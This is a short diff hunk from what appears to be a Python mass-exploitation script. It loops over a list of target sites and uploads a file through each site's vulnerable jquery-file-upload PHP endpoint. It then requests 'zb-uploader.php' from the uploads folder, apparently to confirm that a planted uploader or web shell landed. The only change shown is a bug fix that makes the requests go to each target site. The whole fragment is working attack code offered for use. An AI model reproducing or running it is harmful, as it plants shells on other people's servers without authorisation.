@@ -125,7 +125,7 @@ def jQuL():
 	for site in js:
 		try:
 			print bcolors.NORMAL
-			requests.post(url, headers, timeout=10)
+			requests.post(site, headers, timeout=10)
 			print "Try it => {}".format(site)
 			r = requests.post("{}/assets/plugins/jquery-file-upload/server/php/index.php".format(site), files=files)
 			rc = requests.get("{}/assets/plugins/jquery-file-upload/server/php/files/zb-uploader.php".format(site))
